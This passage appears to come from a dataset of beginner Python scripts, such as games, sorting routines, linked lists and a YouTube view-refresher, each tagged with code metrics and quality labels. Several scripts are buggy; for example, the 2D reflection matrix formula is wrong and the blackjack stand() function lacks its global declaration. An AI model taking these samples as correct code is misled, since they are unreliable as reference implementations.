        ###############################################################################################################
        ###############################################################################################################

        # Cria uma lista para armazenar as partes do corpo do tubo de baixo
        tube2 = []

        # A posiÃ§Ã£o Y do tubo de baixo Ã© calculada com base na posiÃ§Ã£o do tubo de cima, mais o tamanho do pÃ¡ssaro
        height = height + (self.__bird_h * 2) + self.__imageHeight - 1

        # Cria e adiciona Ã  lista do corpo do tubo de baixo, a boca do tubo
        tube2.append(
            self.__background.create_image(
                width, height, image=self.__background.tubeImages[1]
            )
        )

        # Define a altura da imagem do corpo do tubo de baixo
        height = self.__height - height

        # Cria uma nova imagem na lista de imagens com a altura sendo igual a posiÃ§Ã£o Y do tubo de baixo
        self.__background.tubeImages[0][-1].append(
            self.getPhotoImage(
                image=self.__background.tubeImages[2],
                width=self.__imageWidth,
                height=height,
            )[0]
        )

        # Define a posiÃ§Ã£o Y do corpo do tubo de baixo
        y = (self.__height - (height // 2)) + self.__imageHeight // 2

        # Cria e adiciona Ã  lista do corpo do tubo de baixo, o corpo do tubo
        tube2.append(
            self.__background.create_image(
                width, y, image=self.__background.tubeImages[0][-1][1]
            )
        )

        # Adiciona Ã  lista de tubos os tubos de cima e de baixo da posiÃ§Ã£o X
        self.__tubes.append([tube1, tube2])

        # Define a distÃ¢ncia como sendo ZERO
        self.__distance = 0

    def deleteAll(self):
        """"""
        MÃ©todo para deletar todos os tubos gerados
        """"""

        # Deleta os tubos gerados no background
        for tubes in self.__tubes:
            for tube in tubes:
                for body in tube:
                    self.__background.delete(body)

        self.__background.clear()
        self.__background.tubeImages.clear()

    @staticmethod
    def getPhotoImage(
        image=None, image_path=None, width=None, height=None, closeAfter=False
    ):
        """"""
        Retorna um objeto da classe PIL.ImageTk.PhotoImage de uma imagem e as imagens criadas de PIL.Image
        (photoImage, new, original)

        @param image: InstÃ¢ncia de PIL.Image.open
        @param image_path: DiretÃ³rio da imagem
        @param width: Largura da imagem
        @param height: Altura da imagem
        @param closeAfter: Se True, a imagem serÃ¡ fechada apÃ³s ser criado um PhotoImage da mesma
        """"""

        if not image:
            if not image_path:
                return

            # Abre a imagem utilizando o caminho dela
            image = openImage(image_path)

        # SerÃ¡ redimesionada a imagem somente se existir um width ou height
        if not width:
            width = image.width
        if not height:
            height = image.height

        # Cria uma nova imagem jÃ¡ redimensionada
        newImage = image.resize([width, height])

        # Cria um photoImage
        photoImage = PhotoImage(newImage)

        # Se closeAfter for True, ele fecha as imagens
        if closeAfter:
            # Fecha a imagem nova
            newImage.close()
            newImage = None

            # Fecha a imagem original
            image.close()
            image = None

        # Retorna o PhotoImage da imagem,a nova imagem que foi utilizada e a imagem original
        return photoImage, newImage, image

    def move(self):
        """"""
        MÃ©todo para mover todos os tubos
        """"""

        # Cria uma variÃ¡vel auxilar para checar se o mÃ©todo de pontuar foi executado
        scored = False

        # Move os tubos gerados no background
        for tubes in self.__tubes:
            for tube in tubes:

                # Verifica se o pÃ¡ssaro passou do tubo. Caso sim, o mÃ©todo para pontuar serÃ¡ executado
                if not scored:

                    # Recebe a posiÃ§Ã£o do cano
                    x2 = self.__background.bbox(tube[0])[2]

                    # Se a posiÃ§Ã£o ""x2"" do tubo for menor que a posiÃ§Ã£o ""x1"" do pÃ¡ssaro e se ainda nÃ£o tiver sido
                    # pontuado este mesmo cano, o mÃ©todo para pontuar serÃ¡ chamado.

                    if (self.__width / 2) - (self.__bird_w / 2) - self.__move < x2:
                        if x2 <= (self.__width / 2) - (self.__bird_w / 2):

                            # Verifica se o tubo estÃ¡ na lista de tubos passados
                            if not tube[0] in self.__pastTubes:
                                # Chama o mÃ©todo para pontuar e adiciona o tubo pontuado Ã  lista de tubos passados
                                self.__score_method()
                                self.__pastTubes.append(tube[0])
                                scored = True

                # Move cada parte do copo do tubo no background
                for body in tube:
                    self.__background.move(body, -self.__move, 0)

    def run(self):
        """"""
        MÃ©todo para gerar os tubos no background e fazer a sua animaÃ§Ã£o em um loop infinito
        """"""

        # Se o mÃ©todo ""stop"" tiver sido chamado, a animaÃ§Ã£o serÃ¡ encerrada
        if self.__stop:
            return

        # Se os tubos ( cima e baixo ) de uma posiÃ§Ã£o X tiverem sumido da Ã¡rea do background,
        # eles serÃ£o apagados juntamente com suas imagens e todos os seus dados.

        if (
            len(self.__tubes) >= 1
            and self.__background.bbox(self.__tubes[0][0][0])[2] <= 0
        ):

            # Apaga todo o corpo do tubo dentro do background
            for tube in self.__tubes[0]:
                for body in tube:
                    self.__background.delete(body)

            # Remove os tubos ( cima e baixo ) da lista de tubos
            self.__background.tubeImages[0].remove(self.__background.tubeImages[0][0])

            # Remove a imagem do corpo do tubo da lista de imagens
            self.__tubes.remove(self.__tubes[0])

            # Remove o primeiro objeto da lista de tubos passados
            self.__pastTubes.remove(self.__pastTubes[0])

        # Se a distancia entre o Ãºltimo tubo criado e o lado ""x2"" do background for maior que a distÃ¢ncia
        # mÃ­nima estabelecida, entÃ£o um novo tubo serÃ¡ criado.

        if self.__distance >= self.__minDistance:
            self.createNewTubes()
        else:
            # Aumenta a distancia conforme os tubos se movem
            self.__distance += self.__move

        # Move os tubos
        self.move()

        # Executa novamente o mÃ©todo em um determinado tempo
        self.__background.after(self.__animation_speed, self.run)

    def stop(self):
        """"""
        MÃ©todo para interromper a Thread
        """"""

        self.__stop = True
",11617,121,177,72,59,59,27,7.0,38,53,13,92.0,63,,145,424.67435151632895,905.94948944932,9.492063492063492,medio,Yes,False,False,,id56
obs.py,"def watcher(path):
    # python script to observe changes in a folder
    import sys
    import time
    import os
    from watchdog.observers import Observer
    from watchdog.events import FileSystemEventHandler
    from move_to_directory import add_to_dir

    class Handler(FileSystemEventHandler):
        def on_created(self, event):
            if event.event_type == ""created"":
                file_name = os.path.basename(event.src_path)
                ext = os.path.splitext(event.src_path)[1]
                time.sleep(2)
                add_to_dir(ext[1:], event.src_path, path)
                observer.stop()

    observer = Observer()
    event_handler = Handler()
    observer.schedule(event_handler, path, recursive=True)
    observer.start()
    observer.join()
",782,21,20,2,1,1,0,2.0,1,1,1,2.0,2,,3,2.0,4.754887502163469,0.5,medio,Yes,False,False,Low,id57
python.py,"import random

# Define the game board with snakes and ladders
snakes_and_ladders = {
    2: 38, 7: 14, 8: 31, 15: 26, 16: 6, 21: 42,
    28: 84, 36: 44, 46: 25, 49: 11, 51: 67, 62: 19,
    64: 60, 71: 91, 74: 53, 78: 98, 87: 94, 89: 68,
    92: 88, 95: 75, 99: 80
}

# Function to roll a six-sided die
def roll_die():
    return random.randint(1, 6)

# Function to simulate a single turn
def take_turn(current_position, player_name):
    # Roll the die
    roll_result = roll_die()
    print(f""{player_name} rolled a {roll_result}!"")

    # Calculate the new position after the roll
    new_position = current_position + roll_result

    # Check if the new position is a ladder or a snake
    if new_position in snakes_and_ladders:
        new_position = snakes_and_ladders[new_position]
        if new_position > current_position:
            print(""Ladder! Climb up!"")
        else:
            print(""Snake! Slide down!"")

    # Check if the new position exceeds the board size
    if new_position >= 100:
        new_position = 100
        print(f""Congratulations, {player_name} reached the final square!"")

    return new_position

# Main game loop
def play_snakes_and_ladders():
    player1_position = 1
    player2_position = 1

    player1_name = input(""Enter the name of Player 1: "")
    player2_name = input(""Enter the name of Player 2: "")

    current_player = player1_name

    while player1_position < 100 and player2_position < 100:
        print(f""\n{current_player}'s turn:"")
        input(""Press Enter to roll the die."")

        if current_player == player1_name:
            player1_position = take_turn(player1_position, player1_name)
            current_player = player2_name
        else:
            player2_position = take_turn(player2_position, player2_name)
            current_player = player1_name

    print(""\nGame Over!"")
    print(f""{player1_name} ended at square {player1_position}."")
    print(f""{player2_name} ended at square {player2_position}."")
    if player1_position == 100:
        print(f""{player1_name} won!"")
    elif player2_position == 100:
        print(f""{player2_name} won!"")

# Start the game
play_snakes_and_ladders()
",2170,42,46,14,9,9,0,3.0,11,10,7,20.0,12,,30,62.67103446305711,127.43782540330756,5.833333333333333,medio,No,True,True,Low-Medium,id58
blackJackGUI.py,"from __future__ import print_function
import random
import simplegui

CARD_SIZE = (72, 96)
CARD_CENTER = (36, 48)
card_images = simplegui.load_image(
    ""http://storage.googleapis.com/codeskulptor-assets/cards_jfitz.png""
)

in_play = False
outcome = """"
score = 0

SUITS = (""C"", ""S"", ""H"", ""D"")
RANKS = (""A"", ""2"", ""3"", ""4"", ""5"", ""6"", ""7"", ""8"", ""9"", ""T"", ""J"", ""Q"", ""K"")
VALUES = {
    ""A"": 1,
    ""2"": 2,
    ""3"": 3,
    ""4"": 4,
    ""5"": 5,
    ""6"": 6,
    ""7"": 7,
    ""8"": 8,
    ""9"": 9,
    ""T"": 10,
    ""J"": 10,
    ""Q"": 10,
    ""K"": 10,
}


class Card:
    def __init__(self, suit, rank):
        if (suit in SUITS) and (rank in RANKS):
            self.suit = suit
            self.rank = rank
        else:
            self.suit = None
            self.rank = None
            print((""Invalid card: "", suit, rank))

    def __str__(self):
        return self.suit + self.rank

    def get_suit(self):
        return self.suit

    def get_rank(self):
        return self.rank

    def draw(self, canvas, pos):
        card_loc = (
            CARD_CENTER[0] + CARD_SIZE[0] * RANKS.index(self.rank),
            CARD_CENTER[1] + CARD_SIZE[1] * SUITS.index(self.suit),
        )
        canvas.draw_image(
            card_images,
            card_loc,
            CARD_SIZE,
            [pos[0] + CARD_CENTER[0], pos[1] + CARD_CENTER[1]],
            CARD_SIZE,
        )


def string_list_join(string, string_list):
    ans = string + "" contains ""
    for i in range(len(string_list)):
        ans += str(string_list[i]) + "" ""
    return ans


class Hand:
    def __init__(self):
        self.hand = []

    def __str__(self):
        return string_list_join(""Hand"", self.hand)

    def add_card(self, card):
        self.hand.append(card)

    def get_value(self):
        var = []
        self.hand_value = 0
        for card in self.hand:
            card = str(card)
            if card[1] in VALUES:
                self.hand_value += VALUES[card[1]]
                var.append(card[1])
        if ""A"" not in var:
            return self.hand_value
        if self.hand_value + 10 <= 21:
            return self.hand_value + 10
        else:
            return self.hand_value

    def draw(self, canvas, pos):
        for card in self.hand:
            card = str(card)
            Card(card[0], card[1]).draw(canvas, pos)
            pos[0] += 36


class Deck:
    def __init__(self):
        self.Deck = [Card(suit, rank) for suit in SUITS for rank in RANKS]

    def shuffle(self):
        random.shuffle(self.Deck)

    def deal_card(self):
        return random.choice(self.Deck)

    def __str__(self):
        return string_list_join(""Deck"", self.Deck)


def deal():
    global outcome, in_play, score1, score2, player_card, dealer_card, deck
    outcome = """"
    player_card = Hand()
    dealer_card = Hand()
    deck = Deck()
    for i in range(2):
        player_card.add_card(deck.deal_card())
        dealer_card.add_card(deck.deal_card())

    in_play = True
    score1 = str(player_card.get_value())
    score2 = str(dealer_card.get_value())


def stand():
    if in_play == True:
        while dealer_card.get_value() < 17:
            dealer_card.add_card(deck.deal_card())
    if dealer_card.get_value() > 21:
        outcome = ""you won!!""
    elif player_card.get_value() <= dealer_card.get_value():
        outcome = ""you lose""
    else:
        outcome = ""you won!!""
    score1 = str(player_card.get_value())
    score2 = str(dealer_card.get_value())


def hit():
    global outcome, in_play, score1, score2, player_card, dealer_card, deck
    if in_play == True:
        player_card.add_card(deck.deal_card())

    if player_card.get_value() > 21:
        outcome = ""you are busted""
        in_play = False

    score1 = str(player_card.get_value())
    score2 = str(dealer_card.get_value())


def draw(canvas):
    canvas.draw_text(outcome, [250, 150], 25, ""White"")
    canvas.draw_text(""BlackJack"", [250, 50], 40, ""Black"")
    canvas.draw_text(score1, [100, 100], 40, ""Red"")

    player_card.draw(canvas, [20, 300])
    dealer_card.draw(canvas, [300, 300])
    canvas.draw_text(score2, [400, 100], 40, ""Red"")


frame = simplegui.create_frame(""Blackjack"", 600, 600)
frame.set_canvas_background(""Green"")

frame.add_button(""Deal"", deal, 200)
frame.add_button(""Hit"", hit, 200)
frame.add_button(""Stand"", stand, 200)
frame.set_draw_handler(draw)

deal()
frame.start()
",4576,119,143,38,0,0,0,19.0,43,26,9,52.0,49,,78,303.650107374626,456.9225176199506,4.775510204081633,bajo,Yes,False,True,Medium-High,id59
tik_tak.py,"# Tik-tak game


board = [""anything"", 1, 2, 3, 4, 5, 6, 7, 8, 9]
switch = ""p1""
j = 9
print(""\n\t\t\tTIK-TAC-TOE"")


def print_board():
    # import os
    # os.system('cls')
    print(""\n\n"")
    print(""    |     |"")
    print("""", board[1], "" | "", board[2], "" | "", board[3])
    print(""____|_____|____"")
    print(""    |     |"")
    print("""", board[4], "" | "", board[5], "" | "", board[6])
    print(""____|_____|____"")
    print(""    |     |"")
    print("""", board[7], "" | "", board[8], "" | "", board[9])
    print(""    |     |"")


def enter_number(p1_sign, p2_sign):
    global switch
    global j
    k = 9
    while j:
        if k == 0:
            break

        if switch == ""p1"":
            p1_input = int(input(""\nplayer 1 :- ""))
            if p1_input <= 0:
                print(""chose number from given board"")
            else:
                for e in range(1, 10):
                    if board[e] == p1_input:
                        board[e] = p1_sign
                        print_board()
                        c = checkwin()
                        if c == 1:
                            print(""\n\n Congratulation ! player 1 win "")
                            return

                        switch = ""p2""
                        j -= 1
                        k -= 1
                        if k == 0:
                            print(""\n\nGame is over"")
                            break

        if k == 0:
            break

        if switch == ""p2"":
            p2_input = int(input(""\nplayer 2 :- ""))
            if p2_input <= 0:
                print(""chose number from given board"")
                # return
            else:
                for e in range(1, 10):
                    if board[e] == p2_input:
                        board[e] = p2_sign
                        print_board()
                        w = checkwin()
                        if w == 1:
                            print(""\n\n Congratulation ! player 2 win"")
                            return

                        switch = ""p1""
                        j -= 1
                        k -= 1


def checkwin():
    if board[1] == board[2] == board[3]:

        return 1
    elif board[4] == board[5] == board[6]:

        return 1
    elif board[7] == board[8] == board[9]:

        return 1
    elif board[1] == board[4] == board[7]:

        return 1

    elif board[2] == board[5] == board[8]:

        return 1
    elif board[3] == board[6] == board[9]:

        return 1
    elif board[1] == board[5] == board[9]:

        return 1
    elif board[3] == board[5] == board[7]:

        return 1
    else:
        print(""\n\nGame continue"")


def play():
    print_board()
    p1_sign = input(""\n\nplayer 1 chose your sign [0/x] = "")
    p2_sign = input(""player 2 chose your sign [0/x] = "")
    enter_number(p1_sign, p2_sign)
    print(""\n\n\t\t\tDeveloped By :- UTKARSH MATHUR"")


if __name__ == ""__main__"":
    play()
",2929,86,86,26,4,4,0,4.0,26,32,3,56.0,39,42.0,88,210.88557403779117,474.5239332045309,2.1538461538461537,bajo,No,True,False,Medium,id60
is_number.py,"# importing the module to check for all kinds of numbers truthiness in python.
import numbers
from math import pow
from typing import Any

# Assign values to author and version.
__author__ = ""Nitkarsh Chourasia""
__version__ = ""1.0.0""
__date__ = ""2023-08-24""


def check_number(input_value: Any) -> str:
    """"""Check if input is a number of any kind or not.""""""

    if isinstance(input_value, numbers.Number):
        return f""{input_value} is a number.""
    else:
        return f""{input_value} is not a number.""


if __name__ == ""__main__"":
    print(f""Author: {__author__}"")
    print(f""Version: {__version__}"")
    print(f""Function Documentation: {check_number.__doc__}"")
    print(f""Date: {__date__}"")

    print()  # Just inserting a new blank line.

    print(check_number(100))
    print(check_number(0))
    print(check_number(pow(10, 20)))
    print(check_number(""Hello""))
    print(check_number(1 + 2j))
",914,23,22,8,3,3,0,1.0,2,2,2,4.0,4,6.0,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id61
get_crypto_price.py,"import ccxt


def getprice(symbol, exchange_id):
    symbol = symbol.upper()  # BTC/USDT, LTC/USDT, ETH/BTC, LTC/BTC
    exchange_id = exchange_id.lower()  # binance, #bitmex
    symbol_1 = symbol.split(""/"")
    exchange = getattr(ccxt, exchange_id)(
        {
            # https://github.com/ccxt/ccxt/wiki/Manual#rate-limit
            ""enableRateLimit"": True
        }
    )
    try:
        v_price = exchange.fetch_ticker(symbol)
        r_price = v_price[""info""][""lastPrice""]
        if symbol_1[1] == ""USD"" or symbol_1[1] == ""USDT"":
            v_return = ""{:.2f} {}"".format(float(r_price), symbol_1[1])
            return v_return
        else:
            v_return = ""{:.8f} {}"".format(float(r_price), symbol_1[1])
            return v_return
    except (ccxt.ExchangeError, ccxt.NetworkError) as error:
        # add necessary handling or rethrow the exception
        return ""Got an error"", type(error).__name__, error.args
    raise


print(getprice(""btc/usdt"", ""BINANCE""))
print(getprice(""btc/usd"", ""BITMEX""))
",1024,21,25,4,4,1,0,1.0,4,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,alto,No,False,False,Low,id62
FibonacciNumbersWithGenerators.py,"def fibonacci_generator(n = None):
    """"""
        Generating function up to n fibonacci numbers iteratively
        Params:
            n: int
        Return:
            int
    """"""
    f0, f1 = 0, 1
    yield f1
    while n == None or n > 1:
        fn = f0 + f1
        yield fn
        f0, f1 = f1, fn
        n -= 1

for n_fibo in fibonacci_generator(7):
    print(n_fibo)
",379,11,10,1,0,0,7,1.0,3,5,5,10.0,7,,15,31.26112492884004,53.77443751081735,3.571428571428572,alto,No,False,False,Low,id63
power_of_two.py,"# Simple and efficient python program to check whether a number is series of power of two
# Example:
# Input:
# 8
# Output:
# It comes in  power series of 2
a = int(input(""Enter a number""))
if a & (a - 1) == 0:
    print(""It comes in  power series of 2"")
else:
    print(""It does not come in  power series of 2"")
",324,5,5,0,6,6,0,,0,3,3,6.0,5,,9,16.36452797660028,27.0,1.8,alto,No,True,False,Low,id64
gesture_control.py,"import cv2 as cv

# import numpy as np

img = cv.imread(""..\img\hand1.jpg"", 0)
flag, frame = cv.threshold(img, 70, 255, cv.THRESH_BINARY)

contor, _ = cv.findContours(frame.copy(), cv.RETR_TREE, cv.CHAIN_APPROX_SIMPLE)

hull = [cv.convexHull(c) for c in contor]

final = cv.drawContours(img, hull, -1, (0, 0, 0))
cv.imshow(""original_image"", img)
cv.imshow(""thres"", frame)
cv.imshow(""final_hsv"", final)

cv.waitKey(0)
cv.destroyAllWindows()
",440,11,11,6,1,1,0,0.0,0,1,1,1.0,1,,2,0.0,2.0,0.5,alto,No,False,False,Low,id65
Sorted_Inserted_Linked_List.py,"class Node:
    def __init__(self, data):
        self.data = data
        self.next = None


class Circular_Linked_List:
    def __init__(self):
        self.head = None

    def Sorted_Insert(self, new_node):
        current = self.head
        if current is None:
            new_node.next = new_node
            self.head = new_node
        elif current.data >= new_node.data:
            while current.next != self.head:
                current = current.next
            current.next = new_node
            new_node.next = self.head
            self.head = new_node
        else:
            while current.next != self.head and current.next.data < new_node.data:
                current = current.next
            new_node.next = current.next
            current.next = new_node

    def Display(self):
        temp = self.head
        if self.head is not None:
            while temp:
                print(temp.data, ""->"", end="" "")
                temp = temp.next
                if temp == self.head:
                    print(temp.data)
                    break


if __name__ == ""__main__"":
    L_list = Circular_Linked_List()
    Test_list = [12, 56, 2, 11, 1, 90]
    for keys in Test_list:
        temp = Node(keys)
        L_list.Sorted_Insert(temp)
    print(""Sorted Inserted Circular Linked List: "")
    L_list.Display()
",1339,40,40,6,0,0,0,4.0,19,9,7,18.0,12,19.0,27,62.67103446305711,114.6940428629768,5.25,bajo,Yes,False,False,Low-Medium,id66
Merge-sort.py,"# merge sort

lst = []  # declaring list l

n = int(input(""Enter number of elements in the list: ""))  # taking value from user

for i in range(n):
    temp = int(input(""Enter element"" + str(i + 1) + "": ""))
    lst.append(temp)


def merge(ori_lst, left, mid, right):
    L, R = [], []  # PREPARE TWO TEMPORARY LIST TO HOLD ELEMENTS
    for i in range(left, mid):  # LOADING
        L.append(ori_lst[i])
    for i in range(mid, right):  # LOADING
        R.append(ori_lst[i])
    base = left  # FILL ELEMENTS BACK TO ORIGINAL LIST START FROM INDEX LEFT
    # EVERY LOOP CHOOSE A SMALLER ELEMENT FROM EITHER LIST
    while len(L) > 0 and len(R) > 0:
        if L[0] < R[0]:
            ori_lst[base] = L[0]
            L.remove(L[0])
        else:
            ori_lst[base] = R[0]
            R.remove(R[0])
        base += 1
    # UNLOAD THE REMAINER
    while len(L) > 0:
        ori_lst[base] = L[0]
        L.remove(L[0])
        base += 1
    while len(R) > 0:
        ori_lst[base] = R[0]
        R.remove(R[0])
        base += 1
    # ORIGINAL LIST SHOULD BE SORTED FROM INDEX LEFT TO INDEX RIGHT


def merge_sort(L, left, right):
    if left + 1 >= right:  # ESCAPE CONDITION
        return
    mid = left + (right - left) // 2
    merge_sort(L, left, mid)  # LEFT
    merge_sort(L, mid, right)  # RIGHT
    merge(L, left, mid, right)  # MERGE


print(""UNSORTED -> "", lst)
merge_sort(lst, 0, n)
print(""SORTED -> "", lst)
",1426,38,38,9,14,4,0,,10,17,7,,24,,51,129.690584471711,252.66401182973067,4.958333333333333,medio,No,True,False,,id67
password_checker.py,"import time
pwd=""AKS2608""     #any password u want to set

def IInd_func():
  count1=0
  for j in range(5):
    a=0
    count=0
    user_pwd = input("""")        #password you remember
    for i in range(len(pwd)):
      if user_pwd[i] == pwd[a]:       #comparing remembered pwd with fixed pwd
        a +=1
        count+=1 
    if count==len(pwd):
      print(""correct pwd"")
      break
    else:
      count1 += 1
      print(""not correct"")
  if count1==5:
    time.sleep(30)
    IInd_func()

IInd_func()
",506,22,22,2,3,0,0,1.0,6,6,2,12.0,8,,18,26.0,59.794705707972525,1.5,medio,No,True,False,Low,id68
get_youtube_view.py,"""""""
Created on Thu Apr 27 16:28:36 2017
@author: barnabysandeford
""""""
# Currently works for Safari, but just change to whichever
# browser you're using.

import time

# Added pafy to get video length for the user
import pafy

# Changed the method of opening the browser.
# Selenium allows for the page to be refreshed.
from selenium import webdriver

# adding ability to change number of repeats
count = int(input(""Number of times to be repeated: ""))
# Same as before
url = input(""Enter the URL : "")

refreshrate = None

# tries to get video length using pafy
try:
    video = pafy.new(url)
    if hasattr(video, ""length""):
        refreshrate = video.length
# if pafy fails to work, prints out error and asks for video length from the user
except Exception as e:
    print(e)
    print(""Length of video:"")
    minutes = int(input(""Minutes ""))
    seconds = int(input(""Seconds ""))
    # Calculating the refreshrate from the user input
    refreshrate = minutes * 60 + seconds

# Selecting Safari as the browser
driver = webdriver.Safari()

if url.startswith(""https://""):
    driver.get(url)
else:
    driver.get(""https://"" + url)

for i in range(count):
    # Sets the page to refresh at the refreshrate.
    time.sleep(refreshrate)
    driver.refresh()
",1254,25,24,9,12,12,4,0.0,0,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,alto,No,True,False,Low,id69
Letter_Counter.py,"import tkinter as tk

root = tk.Tk()
root.geometry(""400x260+50+50"")
root.title(""Welcome to Letter Counter App"")
message1 = tk.StringVar()
Letter1 = tk.StringVar()


def printt():
    message = message1.get()
    letter = Letter1.get()
    message = message.lower()
    letter = letter.lower()

    # Get the count and display results.
    letter_count = message.count(letter)
    a = ""your message has "" + str(letter_count) + "" "" + letter + ""'s in it.""
    labl = tk.Label(root, text=a, font=(""arial"", 15), fg=""black"").place(x=10, y=220)


lbl = tk.Label(root, text=""Enter the Message--"", font=(""Ubuntu"", 15), fg=""black"").place(
    x=10, y=10
)
lbl1 = tk.Label(
    root, text=""Enter the Letter you want to count--"", font=(""Ubuntu"", 15), fg=""black""
).place(x=10, y=80)
E1 = tk.Entry(
    root, font=(""arial"", 15), textvariable=message1, bg=""white"", fg=""black""
).place(x=10, y=40, height=40, width=340)
E2 = tk.Entry(
    root, font=(""arial"", 15), textvariable=Letter1, bg=""white"", fg=""black""
).place(x=10, y=120, height=40, width=340)
but = tk.Button(
    root,
    text=""Check"",
    command=printt,
    cursor=""hand2"",
    font=(""Times new roman"", 30),
    fg=""white"",
    bg=""black"",
).place(x=10, y=170, height=40, width=380)
# print(""In this app, I will count the number of times that a specific letter occurs in a message."")
# message = input(""\nPlease enter a message: "")
# letter = input(""Which letter would you like to count the occurrences of?: "")

root.mainloop()
",1475,20,36,7,4,4,0,1.0,1,4,1,8.0,8,,12,24.0,38.03910001730775,0.5,medio,No,True,False,Low,id70
Transformations2D.py,"# 2D Transformations are regularly used in Linear Algebra.

# I have added the codes for reflection, projection, scaling and rotation matrices.

import numpy as np


def scaling(scaling_factor):
    return scaling_factor * (np.identity(2))  # This returns a scaling matrix


def rotation(angle):
    arr = np.empty([2, 2])
    c = np.cos(angle)
    s = np.sin(angle)
    arr[0][0] = c
    arr[0][1] = -s
    arr[1][0] = s
    arr[1][1] = c

    return arr  # This returns a rotation matrix


def projection(angle):
    arr = np.empty([2, 2])
    c = np.cos(angle)
    s = np.sin(angle)
    arr[0][0] = c * c
    arr[0][1] = c * s
    arr[1][0] = c * s
    arr[1][1] = s * s

    return arr  # This returns a rotation matrix


def reflection(angle):
    arr = np.empty([2, 2])
    c = np.cos(angle)
    s = np.sin(angle)
    arr[0][0] = (2 * c) - 1
    arr[0][1] = 2 * s * c
    arr[1][0] = 2 * s * c
    arr[1][1] = (2 * s) - 1

    return arr  # This returns a reflection matrix
",980,30,30,13,6,2,0,4.0,4,14,3,27.0,13,16.0,41,52.86060383799767,164.0,3.1153846153846154,medio,No,False,False,Low-Medium,id71
quicksort_linkedlist.py,"""""""
Given a linked list with head pointer, 
sort the linked list using quicksort technique without using any extra space
Time complexity: O(NlogN), Space complexity: O(1)
""""""
from __future__ import annotations


class Node:
    def __init__(self, data: int) -> None:
        self.data = data
        self.next = None


class LinkedList:
    def __init__(self):
        self.head = None

    # method to insert nodes at the start of linkedlist
    def insert(self, new_data: int) -> None:
        new_node = Node(new_data)
        new_node.next = self.head
        self.head = new_node

    # method to print the linkedlist
    def printLL(self) -> None:
        temp = self.head
        if temp == None:
            return 'Linked List is empty'
        while temp.next:
            print(temp.data, '->', end='')
            temp = temp.next
        print(temp.data)
        return

# Partition algorithm with pivot as first element


def partition(start, end):
    if start == None or start.next == None:
        return start
    prev, curr = start, start.next
    pivot = prev.data
    while curr != end:
        if curr.data < pivot:
            prev = prev.next
            temp = prev.data
            prev.data = curr.data
            curr.data = temp
        curr = curr.next
    temp = prev.data
    prev.data = start.data
    start.data = temp
    return prev


# recursive quicksort for function calls
def quicksort_LL(start, end):
    if start != end:
        pos = partition(start, end)
        quicksort_LL(start, pos)
        quicksort_LL(pos.next, end)
        return


if __name__ == ""__main__"":
    ll = LinkedList()
    print(""Enter the space seperated values of numbers to be inserted in linkedlist prompted below:"")
    arr = list(map(int, input().split()))
    for num in arr:
        ll.insert(num)
    print(""Linkedlist before sorting:"")
    ll.printLL()
    quicksort_LL(ll.head, None)
    print('Linkedlist after sorting: ')
    ll.printLL()
",1968,55,54,13,4,4,5,6.0,18,8,4,16.0,15,,24,66.60335893412778,101.95026032264605,2.1333333333333333,medio,Yes,True,False,Low,id72
assembler.py,"from __future__ import print_function

import sys

lines = []  # contains the lines of the file.
tokens = []  # contains all tokens of the source code.

# register eax, ebx,..., ecx
eax = 1
ebx = 0
ecx = 0
edx = 0

# status register
zeroFlag = False

# stack data structure
# push --> append
# pop --> pop
stack = []

# jump link table
jumps = {}

# variable table
variables = {}

# return stack for subprograms
returnStack = []


# simple exception class
class InvalidSyntax(Exception):
    def __init__(self):
        pass


# class for represent a token
class Token:
    def __init__(self, token, t):
        self.token = token
        self.t = t


# def initRegister():
#     global register
#     for i in range(9):
#         register.append(0)


def loadFile(fileName):
    """"""
    loadFile: This function loads the file and reads its lines.
    """"""
    global lines
    fo = open(fileName)
    for line in fo:
        lines.append(line)
    fo.close()


def scanner(string):
    """"""
    scanner: This function builds the tokens by the content of the file.
    The tokens will be saved in list 'tokens'
    """"""
    global tokens
    token = """"
    state = 0  # init state

    for ch in string:

        match state:

            case 0:
            
                match ch:

                    case ""m"":  # catch mov-command

                        state = 1
                        token += ""m""

                    case ""e"":  # catch register

                        state = 4
                        token += ""e""

                    case ""1"":  # catch a number

                        if ch <= ""9"" or ch == ""-"":
                            state = 6
                            token += ch

                    case ""0"":  # catch a number or hex-code

                        state = 17
                        token += ch

                    case ""a"":  # catch add-command

                        state = 7
                        token += ch

                    case ""s"":  # catch sub command

                        state = 10
                        token += ch

                    case ""i"":  # capture int command

                        state = 14
                        token += ch

                    case ""p"":  # capture push or pop command

                        state = 19
                        token += ch

                    case ""l"":  # capture label

                        state = 25
                        token += ch

                    case ""j"":  # capture jmp command

                        state = 26
                        token += ch

                    case ""c"":  # catch cmp-command

                        state = 29
                        token += ch

                    case "";"":  # capture comment

                        state = 33

                    case '""':  # catch a string

                        state = 34
                        # without ""

                    case ch.isupper():  # capture identifier

                        state = 35
                        token += ch

                    case ""d"":  # capture db keyword

                        state = 36
                        token += ch

                    case ""$"":  # catch variable with prefix $

                        state = 38
                        # not catching $

                    case ""_"":  # catch label for subprogram

                        state = 40
                        # not catches the character _

                    case ""r"":  # catch ret-command

                        state = 44
                        token += ch

                    case _:  # other characters like space-characters etc

                        state = 0
                        token = """"

            case 1:  # state 1

                match ch:

                    case ""o"":

                        state = 2
                        token += ch

                    case ""u"":

                        state = 47
                        token += ch

                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()
            
            case 2:  # state 2

                match ch:

                    case ""v"":

                        state = 3
                        token += ""v""

                    case _:# error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 3:  # state 3

                if ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""command""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 4:  # state 4

                if ch >= ""a"" and ch <= ""d"":

                    state = 5
                    token += ch

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 5:  # state 5

                match ch:

                    case ""x"":

                        state = 13
                        token += ch

                    case _:

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 6:  # state 6
            
                if ch.isdigit():

                    state = 6
                    token += ch

                elif ch.isspace():

                    state = 0
                    tokens.append(Token(token, ""value""))
                    token = """"

                else:  # error case

                    state = 0
                    token = """"
                    raise InvalidSyntax()

            case 7:  # state 7
            
                match ch:

                    case ""d"":

                        state = 8
                        token += ch

                    case _: # error case

                        state = 0
                        token = """"
                        raise InvalidSyntax()

            case 8:  # state 8

                match ch:
                    case ""d"":

                        state = 9
